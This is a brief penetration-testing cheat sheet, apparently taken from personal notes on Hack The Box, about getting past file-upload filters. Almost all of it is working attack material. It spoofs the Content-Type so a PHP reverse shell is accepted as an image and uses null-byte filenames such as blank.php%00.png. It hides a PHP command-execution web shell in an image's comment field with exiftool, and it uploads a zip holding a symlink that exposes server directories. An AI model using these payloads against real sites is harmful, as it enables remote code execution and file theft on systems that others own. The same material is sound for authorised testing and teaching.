
![image](https://user-images.githubusercontent.com/9059079/121619876-4c79e100-ca37-11eb-94b9-730b4089ce66.png)

```
Content-Disposition: form-data; name="myFile"; filename="php-reverse-shell.php"
Content-Type: application/x-php

#Change to Content-Type: image/jpeg 
```
###Null Byte
```
blank.php%00.png
blank.php%2500.png
```
In image - exiftool

```
root@Host-001:~/Bureau# exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' blank.png
root@Host-001:~/Bureau# mv blank.png blank.php.png
```

###In image - exiftool
```
ln -s ../ symindex.txt
zip --symlinks test3.zip symindex.txt

1. upload zip 2. visit symindex.txt
```
https://0xss0rz.gitbook.io/0xss0rz/pentest-htb/web-1/bypass/upload-file#zip-file
